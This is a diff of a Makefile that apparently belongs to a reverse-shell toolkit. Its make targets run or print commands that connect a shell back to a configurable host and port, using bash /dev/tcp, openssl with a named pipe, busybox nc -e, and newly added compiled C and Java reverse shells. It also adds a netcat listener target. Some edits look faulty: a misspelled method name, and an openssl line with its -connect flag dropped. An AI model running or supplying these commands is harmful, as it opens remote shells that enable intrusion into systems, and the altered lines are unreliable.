@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP	:= /tmp/f
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-listener curl curl-listener python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan busybox-nc
+METHODS	:= listener bash ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-listener curl curl-listener python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia huskell socat pip cpan busybox-nc gcc javac
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -34,25 +34,23 @@ show:
 	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"
 
 
+######################### LISTENER #########################
+
+listener:
+	nc -lvp $(PORT)
+
+listener-show:
+	@printf "nc -lvp $(PORT)\n"
+
+############################################################
+
 ########################### BASH ###########################
 
-bash1:
+bash:
 	bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'
 
-bash1-show:
+bash-show:
 	@printf "bash -c '$(SHELL) >& /dev/tcp/$(HOST)/$(PORT) 0>&1'\n"
-
-bash2:
-	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'
-
-bash2-show:
-	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); 0<&3; $(SHELL) <&3 >&3 2>&3'\n"
-
-bash3:
-	bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do $$line 2>&3 >&3; done'
-
-bash3-show:
-	@printf "bash -c 'exec 3<>/dev/tcp/$(HOST)/$(PORT); cat <&3 | while read line; do \$$line 2>&3 >&3; done'\n"
 
 ############################################################
 
@@ -137,10 +135,10 @@ socket-show:
 ########################## OPENSSL #########################
 
 openssl:
-	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)
+	mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)
 
 openssl-show:
-	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
+	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
 
 openssl-listener:
 	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
@@ -337,5 +335,30 @@ busybox-nc:
 
 busybox-nc-show:
 	@printf "busybox nc $(HOST) $(PORT) -e $(SHELL)\n"
+
+############################################################
+
+########################### GCC ############################
+
+C_CODE := src/reverse_shell.c
+
+gcc:
+	gcc $(C_CODE) -o out; ./out $(HOST) $(PORT) $(SHELL); rm ./out
+
+gcc-show:
+	@printf "gcc $(C_CODE) -o out; ./out $(HOST) $(PORT) $(SHELL); rm ./out\n"
+
+############################################################
+
+########################## JAVAC ###########################
+
+JAVA_CODE := src/ReverseShell.java
+JAVA_BYTECODE := ReverseShell
+
+javac:
+	javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class
+
+javac-show:
+	@printf "javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class\n"
 
 ############################################################
